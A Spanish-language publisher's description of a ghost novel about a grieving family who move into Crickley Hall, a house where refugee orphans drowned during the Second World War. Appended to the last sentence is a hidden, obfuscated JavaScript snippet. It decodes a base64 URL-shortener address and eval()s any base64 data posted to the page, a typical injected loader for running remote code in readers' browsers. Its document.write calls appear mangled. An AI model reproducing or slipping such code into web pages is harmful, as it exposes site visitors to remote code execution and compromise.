Descripcion
Gabe y Eve acaban de perder a su hijo Cam, desaparecido en circunstancias extrañas. Para recuperarse de la desgracia, Gabe acepta un trabajo lejos de Londres y se instalan con sus dos hijas en una casona situada en lo alto de un barranco, a merced de los vientos y la lluvia. Tras sobrevivir a la primera noche, todos amanecen convencidos de que Crickley Hall tiene vida propia: se oyen ruidos, crujidos, pisadas en la buhardilla, charcos de agua que aparecen y desaparecen… En un primer momento, Gabe cree que todo se debe a la fragilidad emocional en la que está sumida su familia, especialmente Eve, que es incapaz de superar el sentimiento de culpa por la desaparición de su hijo.
Al día siguiente, la gente del pueblo les cuenta que Crickley Hall también está marcada por la tragedia, porque en una noche de tormenta durante la Segunda Guerra Mundial, cuando albergaba a un grupo de refugiados huérfanos, los críos perecieron ahogados en el sótano por la crecida de las aguas. Gabe comprueba que el peso de ese suceso ha empezado a afectar a sus hijas, y decide que ha llegado el momento de marcharse. Sin embargo, Eve sigue aferrada a la idea de que Cam está vivo, no puede evitar relacionarlo con la horrible muerte de esos niños y necesita quedarse. ¿Qué hacían allí esos niños? ¿Cómo se olvidaron de ellos? ¿Y si ella se hubiera olvidado de Cam?(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write(");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write(")})();

